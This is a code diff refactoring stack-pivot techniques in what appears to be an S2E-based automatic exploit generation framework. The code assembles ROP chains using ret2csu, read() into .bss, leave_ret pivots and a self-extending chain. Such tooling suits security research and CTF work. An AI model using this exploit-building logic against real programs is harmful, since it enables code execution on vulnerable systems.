@@ -31,8 +31,7 @@ using namespace klee;
 
 namespace s2e::plugins::crax {
 
-using SymbolicRopPayload = Technique::SymbolicRopPayload;
-using ConcreteRopPayload = Technique::ConcreteRopPayload;
+using RopSubchain = Technique::RopSubchain;
 
 BasicStackPivot::BasicStackPivot(CRAX &ctx)
     : StackPivot(ctx) {
@@ -59,33 +58,30 @@ void BasicStackPivot::resolveRequiredGadgets() {
     m_ctx.getExploit().registerSymbol("pivot_dest", m_ctx.getExploit().getElf().bss() + 0x800);
 }
 
-std::string BasicStackPivot::getAuxiliaryFunctions() const {
-    return "";
-}
 
-std::vector<SymbolicRopPayload> BasicStackPivot::getSymbolicRopPayloadList() const {
+std::vector<RopSubchain> BasicStackPivot::getRopSubchains() const {
     Ret2csu *ret2csu = dynamic_cast<Ret2csu *>(Technique::s_mapper["Ret2csu"]);
     assert(ret2csu);
 
     // RBP
-    SymbolicRopPayload part1 = {
+    RopSubchain part1 = {
         ConstantExpr::create(0, Expr::Int64)};
 
     // Write the 2nd stage ROP payload via read() to `pivot_dest`
     // via ret2csu(read, 0, pivot_dest, 1024).
-    SymbolicRopPayload part2 = ret2csu->getSymbolicRopPayloadList(
+    RopSubchain part2 = ret2csu->getRopSubchains(
         BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
         ConstantExpr::create(1024, Expr::Int64))[0];
 
     // Perform stack pivoting.
-    SymbolicRopPayload part3 = {
+    RopSubchain part3 = {
         BaseOffsetExpr::create(m_ctx.getExploit(), "", "pop_rbp_ret"),
         BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
         BaseOffsetExpr::create(m_ctx.getExploit(), "", "leave_ret")};
 
-    SymbolicRopPayload ret;
+    RopSubchain ret;
     ret.reserve(part1.size() + part2.size() + part3.size());
     ret.insert(ret.end(), part1.begin(), part1.end());
     ret.insert(ret.end(), part2.begin(), part2.end());
@@ -93,12 +89,8 @@ std::vector<SymbolicRopPayload> BasicStackPivot::getSymbolicRopPayloadList() con
     return {ret};
 }
 
-ConcreteRopPayload BasicStackPivot::getExtraPayload() const {
-    return {0};  // rbp
-}
-
-std::string BasicStackPivot::toString() const {
-    return "BasicStackPivot";
+RopSubchain BasicStackPivot::getExtraRopSubchain() const {
+    return { ConstantExpr::create(0, Expr::Int64) };  // rbp
 }
 
 
@@ -134,11 +126,8 @@ void AdvancedStackPivot::resolveRequiredGadgets() {
     m_ctx.getExploit().registerSymbol("pivot_dest", m_ctx.getExploit().getElf().bss() + 0x800);
 }
 
-std::string AdvancedStackPivot::getAuxiliaryFunctions() const {
-    return "";
-}
 
-std::vector<SymbolicRopPayload> AdvancedStackPivot::getSymbolicRopPayloadList() const {
+std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
     assert(m_readCallSites.size() &&
            "AdvancedStackPivot requires at least one call site of read@libc");
 
@@ -151,13 +140,13 @@ std::vector<SymbolicRopPayload> AdvancedStackPivot::getSymbolicRopPayloadList() 
     uint64_t ret2LeaRbp = determineRetAddr(readCallSiteInfo.address);
 
     // Return to a previous call site of read@libc.
-    SymbolicRopPayload part1 = {
+    RopSubchain part1 = {
         ByteVectorExpr::create(std::vector<uint8_t>(m_offsetToRetAddr, 'A')),
         BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
         BaseOffsetExpr::create(m_ctx.getExploit(), "", std::to_string(ret2LeaRbp))};
 
     // Generate the payload which guides the weird machine back to the exploitable state.
-    SymbolicRopPayload part2 = {
+    RopSubchain part2 = {
         ByteVectorExpr::create(std::vector<uint8_t>(m_offsetToRetAddr, 'A')),
         AddExpr::alloc(
                 BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
@@ -173,7 +162,7 @@ std::vector<SymbolicRopPayload> AdvancedStackPivot::getSymbolicRopPayloadList() 
     // a huge read() via ret2csu. So here we'll build a self-extending ROP chain
     // which continuously calls read@plt until there's enough space to perform
     // ret2csu once.
-    SymbolicRopPayload part3;
+    RopSubchain part3;
     for (size_t i = 0; i < 6; i++) {
         ref<Expr> e0 = BaseOffsetExpr::create(m_ctx.getExploit(), "", "pop_rsi_r15_ret");
         ref<Expr> e1 = AddExpr::alloc(
@@ -194,7 +183,7 @@ std::vector<SymbolicRopPayload> AdvancedStackPivot::getSymbolicRopPayloadList() 
 
     // Now, we should have accumulated enough space to perform a huge read() via ret2csu.
     // read(0, pivot_dest + 0x30 * 7, 0x400).
-    SymbolicRopPayload part4 = ret2csu->getSymbolicRopPayloadList(
+    RopSubchain part4 = ret2csu->getRopSubchains(
             BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
             ConstantExpr::create(0, Expr::Int64),
             AddExpr::alloc(
@@ -209,23 +198,16 @@ std::vector<SymbolicRopPayload> AdvancedStackPivot::getSymbolicRopPayloadList() 
     }
 
 
-    std::vector<SymbolicRopPayload> ret = {part1, part2};
+    std::vector<RopSubchain> ret = {part1, part2};
     for (size_t i = 0; i < part3.size(); i += 6) {
-        ret.push_back(SymbolicRopPayload(part3.begin() + i, part3.begin() + i + 6));
+        ret.push_back(RopSubchain(part3.begin() + i, part3.begin() + i + 6));
     }
     for (size_t i = 0; i < part4.size(); i += 6) {
-        ret.push_back(SymbolicRopPayload(part4.begin() + i, part4.begin() + i + 6));
+        ret.push_back(RopSubchain(part4.begin() + i, part4.begin() + i + 6));
     }
     return ret;
 }
 
-ConcreteRopPayload AdvancedStackPivot::getExtraPayload() const {
-    return {};
-}
-
-std::string AdvancedStackPivot::toString() const {
-    return "AdvancedStackPivot";
-}
 
 void AdvancedStackPivot::maybeInterceptReadCallSites(S2EExecutionState *state,
                                                      const Instruction &i) {
